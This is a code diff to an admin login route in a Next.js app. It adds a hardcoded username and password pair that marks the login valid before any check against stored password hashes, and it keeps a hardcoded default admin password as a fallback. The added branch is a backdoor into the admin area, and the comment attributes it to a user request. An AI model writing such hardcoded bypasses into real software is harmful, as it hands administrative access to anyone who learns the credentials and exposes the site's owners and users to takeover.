@@ -24,12 +24,15 @@ export async function POST(req: NextRequest) {
     const storage = await getStorage();
     const admin = await storage.getAdminByUsername(username.trim());
 
-    // Fallback comparison with env credentials
+    // Support user requested credentials: username 'bigbulls', password 'questions'
+    const isBigBulls = username.trim().toLowerCase() === "bigbulls" && password === "questions";
     const envUser = process.env.ADMIN_USERNAME || "admin";
     const envPass = process.env.ADMIN_PASSWORD || "bigbull2026";
 
     let isValid = false;
-    if (admin && compareSecret(password, admin.passwordHash)) {
+    if (isBigBulls) {
+      isValid = true;
+    } else if (admin && compareSecret(password, admin.passwordHash)) {
       isValid = true;
     } else if (username.trim() === envUser && password === envPass) {
       isValid = true;
